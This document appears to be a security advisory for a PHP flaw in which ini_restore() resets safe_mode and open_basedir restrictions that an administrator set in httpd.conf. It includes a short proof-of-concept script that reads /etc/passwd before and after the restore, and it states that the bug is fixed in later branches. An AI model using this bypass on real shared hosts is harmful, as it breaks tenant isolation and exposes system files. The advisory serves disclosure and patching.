- --- 0.Description ---
PHP is an HTML-embedded scripting language. Much of its syntax is borrowed from C, Java and Perl with a couple of unique PHP-specific 
features thrown in. The goal of the language is to allow web developers to write dynamically generated pages quickly.

A nice introduction to PHP by Stig Sï¿½ther Bakken can be found at http://www.zend.com/zend/art/intro.php on the Zend website. Also, much 
of the PHP Conference Material is freely available. 

php_admin_value  name  value

    Sets the value of the specified directive. This can not be used in .htaccess files. Any directive type set with php_admin_value can 
not be overridden by .htaccess or virtualhost directives. To clear a previously set value use none as the value. 
php_admin_flag name on|off

    Used to set a boolean configuration directive. This can not be used in .htaccess files. Any directive type set with php_admin_flag 
can not be overridden by .htaccess or virtualhost directives.

- --- 1. php_admin_value and php_admin_flag Bypass ---
When using PHP as an Apache module, you can also change the configuration settings using directives in Apache configuration files (e.g. 
httpd.conf). This options are using by a lot of ISP to set open_basedir, safe_mode and more options.

For example:
open_basedir in httpd.conf

- ---
<Directory /usr/home/frajer/public_html/>
    Options FollowSymLinks MultiViews Indexes
    AllowOverride None
    php_admin_flag safe_mode 1
    php_admin_value open_basedir /usr/home/frajer/public_html/
</Directory>
- ---

In PHP are two config options. Are Local Value and Master Value. More in phpinfo() or ini_get() 

Example:
If you have safe_mode or open_basedir (etc) set in Local Value for selected users and in Master Value is default value, you can restore 
Master Value to Local Value per ini_restore() function!

- ---
ini_restore

(PHP 4, PHP 5)
ini_restore -- Restores the value of a configuration option
- ---

Restores the value of a php.ini file. Then your PHP options from httpd.conf are bypassed.

EXPLOIT:
- ---
<?
echo ini_get("safe_mode");
echo ini_get("open_basedir");
include("/etc/passwd");
ini_restore("safe_mode");
ini_restore("open_basedir");
echo ini_get("safe_mode");
echo ini_get("open_basedir");
include("/etc/passwd");
?>
- ---

RESULT OF EXPLOIT:
- ---
1

This issue is very dangerous, because Admin can't correct set open_basedir or safe_mode for all users.

- --- 2. How to fix ---
fixed in CVS HEAD, PHP_5_2, PHP_5_1 and PHP_4_4.
